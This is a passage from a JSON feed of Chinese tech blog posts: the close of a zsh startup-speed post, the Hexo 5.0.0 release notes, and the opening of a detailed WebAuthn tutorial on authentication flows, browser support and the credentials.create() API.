起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\"> <div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-08-10</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">Hexo 5.0.0 正式发布</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-07-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"\n<p>WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将其表述为 “An API for accessing Public Key Credentials”，即“一个用于访问公钥凭证的 API”。WebAuthn 很强大，强大到被认为是 Web 身份认证的未来（当然，也很复杂）。你有想过通过指纹或者面部识别来登录网站吗？WebAuthn 就能在保证安全和隐私的情况下让这样的想法成为现实。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"通过 WebAuthn 调起 Windows Hello 登录网站\" width=\"1912\" height=\"966\" class=\"aligncenter size-full wp-image-2215\"></a>\n<p>你可以在<a href=\"https://webauthn.io/\" rel=\"noopener\">这个网站</a>自行体验 WebAuthn。或者，如果你有一个使用 WordPress 的站点，可以尝试一下 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WP-WebAuthn</a> 这款插件，它可以为你的站点启用 WebAuthn 登录。这是我为了写这篇文章而练手开发的插件，本文中的部分示例代码也来自这款插件。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"wp-webauthn\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/wp-webauthn\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>WebAuthn Level 1 标准已在 2019 年 3 月成为 W3C 推荐标准，而 Level 2 标准目前也已进入编辑草案阶段，但互联网上有关它的中文资料却仍然很少，国内也鲜有网站支持这一新标准。于是，在抱着各种英文资料和标准啃了几天以后，我折腾出了这篇文章。</p>\n<p>在这篇文章里，我将会从最基本的概念开始，逐渐深入 WebAuthn，直到解码公钥等深层细节。这可能是你能找到的有关 WebAuthn 最详细最基础的中文文章，也很可能是最长的。在开始之前，<strong>我强烈建议你打开菜单中的文章目录浏览一遍，以对这篇文章涉及的内容有所了解。</strong>如果你只是想了解如何简单地在你的项目中添加对 WebAuthn 的支持，那么“<a href=\"https://flyhigher.top/#webauthn-overview\">浅谈 WebAuthn</a>”部分就是你要找的；如果你想了解更多关于 WebAuthn 的底层细节，那么你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分。</p>\n<p>由于在本文写作时 WebAuthn Level 2 规范尚未定稿，<strong>这篇文章我们将只专注于 Level 1 规范。</strong></p>\n<p>这篇文章最后更新于 2020.9 ，在你读到这篇文章时，部分事实可能已经发生改变，请注意判断。</p>\n<p><strong>更新日志：</strong></p>\n<ul>\n<li>2021.1.16 添加 Chrome 开发工具信息</li>\n<li>2020.9.17 更新 iOS/iPad OS 兼容性信息</li>\n<li>2020.5.20 添加部分无用户名认证的平台兼容性内容</li>\n<li>2020.5.15 添加部分 <code>extensions</code> 相关内容与链接；添加全局凭证 ID 唯一内容；添加凭证 ID 查找相关内容；添加“从 U2F 认证迁移”一节</li>\n<li>2020.4.13 更新与修正 <code>userVerification</code> 相关内容；添加部分 Firefox 相关内容</li>\n<li>2020.3.23 文章发布</li>\n</ul>\n<p>那么让我们开始吧。<span></span></p>\n<h1>浅谈 WebAuthn</h1>\n<p>在这个部分里，我们将会从基础概念开始，了解有关 WebAuthn 和密码学的一些基础知识，并最终使用第三方库实现基础的 WebAuthn 认证。如果你已经对这些内容有所了解了，可以跳到“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”继续阅读。</p>\n<h2>为什么使用 WebAuthn</h2>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"钓鱼邮件\" width=\"709\" height=\"693\" class=\"aligncenter size-full wp-image-2162\"></a>\n<p>相信你一定收到过类似的邮件吧？只要你点进那个最显眼的链接，你就会进入一个设置好的圈套——钓鱼网站。如果你一时糊涂在这类网站上填写了你的账号和密码，bingo，你的账号就不再是你的账号了。</p>\n<p>不过，就算你警惕心再强，也无法避免密码泄露事件。Twitter, Facebook 等都爆出过明文密码泄露事件，证明再大的公司或组织也无法避免密码泄露问题。雪上加霜的是，很大一部分用户都非常喜欢使用重复密码，这就导致一次密码泄露会牵连很多网站，用户的账户安全性完全无法得到保证。</p>\n<p>那么，有什么办法解决这些问题吗？<strong>彻底解决的方法只有一个，那就是抛弃密码。</strong>可是没有密码还怎么验证用户身份呢？这就是 WebAuthn 的用武之地了。</p>\n<p><del>没有密码的好时代，来临力！</del></p>\n<h2>什么是 WebAuthn</h2>\n<p>那么到底什么是 WebAuthn 呢？如开头所说，WebAuthn 是“一个用于访问公钥凭证的 API”，网站可以通过这个 API 进行一些高安全性的身份验证。WebAuthn 一个最常见的应用就是用于网站登录时的 2FA（双重因素验证）甚至是无密码登录。通过网页调用 WebAuthn，在不同平台下，<strong>我们可以实现通过 USB Key、指纹、面部甚至虹膜扫描来认证身份，同时确保安全和隐私。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 可使用的各种身份认证方式\" width=\"1294\" height=\"566\" class=\"aligncenter size-full wp-image-2213\"></a>\n<p>WebAuthn 标准是 FIDO2 标准的一部分，而 FIDO2 则是由 FIDO 联盟和 W3C 共同推出的 U2F（现称作 FIDO1）的后继标准，旨在增强网络认证的安全性。</p>\n<blockquote><p>你可能了解过 U2F，那么 U2F 和 FIDO2 的区别在哪里呢？从名字上可以看出，U2F，即“通用第二因素协议”，是专注于作为密码后的第二道屏障的，而 FIDO2 增加了单因素认证功能，这意味着使用 FIDO2 可以完全替代密码，真正实现无密码登录。</p></blockquote>\n<p>FIDO2 标准主要包括四个部分，其一是用于网站和访客设备交互的 WebAuthn，而 Client to Authenticator Protocol 2（CTAP2，客户端-认证器协议）作为 WebAuthn 的补充，则是用于访客的设备和认证器交互的协议。标准的其他两个部分则是 U2F 和 UAF 规范。在这篇文章中，我们只关心 WebAuthn，不会涉及 CTAP, U2F 和 UAF 的相关知识。如果你对这段话中的一些概念不了解，不要紧张，接下来我们就来谈谈 WebAuthn 中一些常用的术语和概念。</p>\n<blockquote><p>WebAuthn 只能在安全上下文中使用，也就是说，页面需要使用 HTTPS 协议或是处于 <code>localhost</code> 中。</p></blockquote>\n<h2>常用术语和概念</h2>\n<p>WebAuthn 中有许多不常碰到的术语，不过我只会在这里介绍一些常用的术语和概念——如果你只是希望做出一个简单的实现，那么了解这一段中的一些概念就足够了。同时，由于我实在没能找到一部分术语的通用翻译，有一些术语我按着自己的理解尽可能地翻译了，有任何问题请告诉我。</p>\n<p>在一个完整的 WebAuthn 认证流程中，通常有这么几个角色：</p>\n<ul>\n<li>Relying Party 依赖方 (RP) ：指服务提供方，即网站</li>\n<li>User 用户：正准备登录的你</li>\n<li>Authenticator 认证器：通常指 USB Key 或是设备内置的指纹扫描器、虹膜扫描器、面部识别装置等，正是它们在使用流程中代替了密码甚至是用户名</li>\n<li>User Agent 用户代理：通常指浏览器或系统，负责与认证器交互</li>\n</ul>\n<p>认证过程通常分为两种：</p>\n<ul>\n<li>Registration Ceremony 注册仪式：用户向账户上添加认证器</li>\n<li>Authentication Ceremony 验证仪式：用户通过已注册的认证器验证身份</li>\n</ul>\n<p>同时，认证过程中还会产生这些内容：</p>\n<ul>\n<li>Challenge 挑战：通常是一串随机字符串</li>\n<li>Public Key Credential 公钥凭证：由认证器产生的凭证，在技术上代替了密码</li>\n<li>Attestation 证明：注册时认证器产生的验证数据</li>\n<li>Assertion 断言：验证时认证器产生的验证数据</li>\n</ul>\n<blockquote><p><strong>请注意区分证明 (Attestation) 和断言 (Assertion)</strong>，特别是在这两个单词有些相似的情况下。在 WebAuthn 中，它们是不同过程中的类似概念，但并不相同。</p></blockquote>\n<p>如果你对于这些内容不是很理解，没有关系，我们会在“<a href=\"https://flyhigher.top/#how-to-webauthn\">使用流程</a>”一节中将这些概念放到实际情况中解释，你只要先区分这些概念即可。</p>\n<h2>安全性的基础</h2>\n<p>WebAuthn 为什么安全？和 HTTPS 一样，WebAuthn 使用非对称加密的思路来保证安全性，但侧重点又有所不同。要理解 WebAuthn 的认证流程，我们必须对非对称加密有所了解。如果你对非对称加密比较熟悉了，就直接跳到下一段吧。</p>\n<p>WebAuthn 的核心在于“认证”，即保证产生了凭证的认证器是用户的认证器，而不是第三方在伪造凭证。但为什么要使用非对称加密呢？我们可以先来看看对称加密。</p>\n<p>让我们假设小明和小红相互写信，见不到对方。这天小红突然想，给自己写信的人是不是真的小明呢？于是小红要求对方向小红证明自己是小明。怎么证明呢？他们商量出来这么一套方案：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明和小红商量一个统一的密码和密钥</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明用提前和小红商量好的密码和密钥加密文本后发回给小红</li>\n<li>小红使用相同的密码和密钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和密钥</li>\n</ol>\n<blockquote><p>在密码学中，我们通常把“加密算法”称为密码 (code)，和通常登录时用的密码 (password) 并非同一个概念。</p></blockquote>\n<p>在这种情况下，<strong>只要密钥不泄露</strong>，即拥有正确密钥的只有小明和小红，那么小红就能确定对方一定是小明。但这样的问题也很明显，如果小明和小红不能见面，那么他们就必须先以明文交换密码——<strong>在这个过程中一旦有人窃取到了密码，这个认证就无效了。</strong></p>\n<p>这时我们就需要使用<strong>非对称加密</strong>来拯救破碎的信任了。非对称加密的基础是一对密钥，也就是公钥和私钥，它们是互相关联但（几乎）无法互相推导的。在非对称加密的过程中，选择相同的密码后，使用私钥加密明文得到的密文只能由对应的公钥解密，无法使用私钥解密，同时这个过程反过来也是成立的。</p>\n<blockquote><p>本文的核心并不是非对称加密算法，因此不会详述非对称加密在数学上的证明，若有兴趣可以自行了解。</p></blockquote>\n<p>这就完美解决密钥泄露的问题了。让我们回过头来看之前的例子。现在小明和小红决定使用非对称加密来证明身份，过程如下：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明提前生成一对公私钥，将公钥发送给小红，私钥自己保管，同时商量好统一的密码</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明使用商量好的密码和自己的私钥加密文本，发送给小红</li>\n<li>小红使用相同的密码和小明的公钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和私钥</li>\n</ol>\n<p>在这种情况下，<strong>只要私钥不泄露</strong>，那么小红解密得到的文本和之前发送的一致，那么就可以证明收到的密文一定是由小明加密后发送过来的。而在整个过程中，私钥都没有离开过小明，更没有经过传输，也就几乎没有泄露的可能了。这时，小红终于可以确定对面和她通信的人的确是小明了。</p>\n<p>题外话：HTTPS 虽然也应用了非对称加密，但 HTTPS 更侧重于“加密”而非“认证”，因此思路上会有些许差异。要了解关于 HTTPS 和非对称加密的更多信息，你可以阅读我之前写的这篇文章：</p>\n<p></p>\n<div class=\"mdx-post-cot\" data-mdxposturl=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdx-post-wait-out-c2\"><div class=\"mdx-post-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<span></span>\n<h2>使用流程</h2>\n<p>了解了非对称加密，我们就可以来看看 WebAuthn 的认证流程了。</p>\n<p>和普通的密码一样，<strong>使用 WebAuthn 分为两个部分，注册和验证。</strong>注册仪式会在依赖方中将认证器的一些信息和用户建立关联；而验证仪式则是验证这些信息以登确保是用户本人在登录。根据上一节的思路，我们可以知道，注册仪式就是认证器生成一对公私钥，然后将公钥交给依赖方；而验证仪式是依赖方发送给认证器一段文本，要求认证器用自己的私钥加密后发回以验证。</p>\n<p>在实际情况中，WebAuthn 是基于<strong>挑战-应答模型</strong>工作的。要更好地理解，我们直接来看具体流程。先来看看注册的流程。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 注册流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2224\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的注册请求</li>\n<li>依赖方向浏览器发送挑战、依赖方信息和用户信息</li>\n<li>浏览器向认证器发送挑战、依赖方信息、用户信息和客户端信息以请求创建公钥凭证</li>\n<li>认证器请求用户动作，随后创建一对公私钥，并使用私钥签名挑战（即证明），和公钥一起交给浏览器</li>\n<li>浏览器将签名后的挑战和公钥发送给依赖方</li>\n<li>依赖方用公钥验证挑战是否与发送的一致，如果成功则将公钥与用户绑定，注册完成</li>\n</ol>\n<p>我也做了一个交互式的 Demo，你可以对照流程来更好地理解。</p>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\">开始注册</button> <span></span></p>\n<div></div>\n<blockquote><p>注意，这个 Demo 和下方的 Demo 都只是一个本地模拟的简单示例，没有任何数据会被上传，当然也不会对数据进行验证。</p></blockquote>\n<p>而之后的验证流程如下：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 验证流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2226\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的验证请求</li>\n<li>依赖方向浏览器发送挑战</li>\n<li>浏览器向认证器发送挑战、依赖方信息和客户端信息以请求获取公钥凭证</li>\n<li>认证器请求用户动作，随后通过依赖方信息找到对应私钥，并使用私钥签名挑战（即断言），交给浏览器</li>\n<li>浏览器将签名后的挑战发送给依赖方</li>\n<li>依赖方用之前存储的公钥验证挑战是否与发送的一致，一致则验证成功</li>\n</ol>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\" disabled>开始验证</button> <span>在上方注册后才能验证</span></p>\n<div></div>\n<p>可以看到，WebAuthn 不仅在理论上是安全的，同时<strong>在整个过程中并没有隐私数据被传输</strong>——用户信息实际上只包含用户名和用户 ID。因此我们完全可以说 WebAuthn 是安全且私密的。</p>\n<blockquote><p>为了避免用户在不同依赖方之间被追踪，认证器通常会为每个依赖方和用户的组合都创建一对公私钥。不过，由于认证器的存储空间有限，认证器通常不会存储每一个私钥，而是会通过各类信息和烧录在认证器内的主密钥“算”出对应的私钥以实现无限对公私钥。具体算法根据不同厂商会有所不同。对于 Yubikey，你可以在<a href=\"https://developers.yubico.com/U2F/Protocol_details/Key_generation.html\">这里</a>了解更多。</p></blockquote>\n<blockquote><p>如果依赖方需要，用户同意后，发送给依赖方的公钥凭证中可以包含用于辨认认证器型号的信息，不过这对隐私的影响微乎其微。</p></blockquote>\n<h2>浏览器接口</h2>\n<p>要使用 WebAuthn，我们必须要依靠浏览器作为媒介和验证器进行交互，而这就需要浏览器对于 WebAuthn 的支持了。绝大多数新版本的现代浏览器都为 WebAuthn 提供了统一的接口，而在这一段中我们会了解如何使用相关的接口。但是在开始之前，我们可以先来看看浏览器的支持程度（2020.9）。</p>\n<div class=\"mdui-table-fluid\"><table class=\"mdui-table\">\n<thead><tr>\n<th>浏览器</th>\n<th>支持情况</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>桌面端 Chrome</td>\n<td>67+</td>\n</tr>\n<tr>\n<td>移动端 Chrome</td>\n<td>67+<sup>[1]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Firefox</td>\n<td>60+</td>\n</tr>\n<tr>\n<td>移动端 Firefox</td>\n<td>不支持<sup>[2]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Edge</td>\n<td>18+</td>\n</tr>\n<tr>\n<td>移动端 Edge</td>\n<td>不支持<sup>[3]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Safari</td>\n<td>13+</td>\n</tr>\n<tr>\n<td>移动端 Safari</td>\n<td>13.3+<sup>[4]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Opera</td>\n<td>54+</td>\n</tr>\n<tr>\n<td>移动端 Opera</td>\n<td>不支持</td>\n</tr>\n</tbody>\n</table></div>\n<p><sup>[1]</sup> 受平台限制，Chrome 在 iOS 平台上不支持 WebAuthn，在 Android 平台上支持大部分 WebAuthn 功能，但仍不支持部分特性（如 <code>userVerification</code>）。<br><sup>[2]</sup> 移动端 Firefox 80 以下的版本支持 WebAuthn 但似乎会忽略 <code>authenticatorAttachment</code> 等一部分参数，同时移动端 Firefox Beta 80 以下的版本支持 WebAuthn 但无法成功调用。自 80 版本起移动端 Firefox 暂时取消了对 WebAuthn 的支持（可能是 Bug）。<br><sup>[3]</sup> 移动端 Edge 似乎支持 WebAuthn 但无法成功调用。<br><sup>[4]</sup> Safari iOS/iPad OS 13 仅支持外部认证器，无法调用 Touch ID 或 Face ID；自 iOS/iPad OS 14 起 Safari 已支持全功能 WebAuthn，可以调用 Touch ID/Face ID</p>\n<p>当然，一众国产浏览器，包括 Samsung Browser 和 Yandex Browser，目前都不支持 WebAuthn。此外，由于 WebAuthn 涉及外部验证器和 TPM 可信平台模块等，用户的操作系统也会对 WebAuthn 的可用性造成影响。以下是一些需要注意的信息：</p>\n<ul>\n<li>Windows 10 1903 以下版本仅 Edge 能提供完整支持，其他浏览器只能使用 USB Key 等外部认证器；1903+ 中所有浏览器都可以通过 Windows Hello 带来完整的 WebAuthn 支持</li>\n<li>Android 需要安装并开启 Google 服务</li>\n<li>iOS/iPad OS 13.3 以下的版本不支持 WebAuthn，iOS/iPad OS 14 以下的版本支持有限（参考上文），iOS/iPad OS 14 开始 Safari 已支持全功能 WebAuthn（功能完整度甚至超过了 Android）</li>\n</ul>\n<p>可以看出，WebAuthn 的发展之路仍然很漫长，但好在桌面端对它的支持已经比较完善了，在一些情况下我们完全有理由使用它。</p>\n<hr>\n<p>来看看浏览器提供了怎么样的接口吧。要使用 WebAuthn，我们可以使用 <code>navigator.credentials.create()</code> 请求认证器生成公钥凭证和 <code>navigator.credentials.get()</code> 请求获取公钥凭证。</p>\n<blockquote><p>你或许已经对 Credential Management API 有所了解了。通过这些 API，我们还可以实现一些有趣的特性，不过这值得另开一篇文章来讲了。</p></blockquote>\n<p>对于一个基础的实现，<code>navigator.credentials.create()</code> 需要传入的参数如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        challenge,\r\n        rp: {\r\n            id,\r\n            name\r\n        },\r\n        user: {\r\n            id,\r\n            name,\r\n            displayName\r\n        },\r\n        pubKeyCredParams: [\r\n            {\r\n                type: \"public-key\",\r\n                alg\r\n            }\r\n        ],\r\n        authenticatorSelection: {\r\n            authenticatorAttachment,\r\n            userVerification\r\n        },\r\n        excludeCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    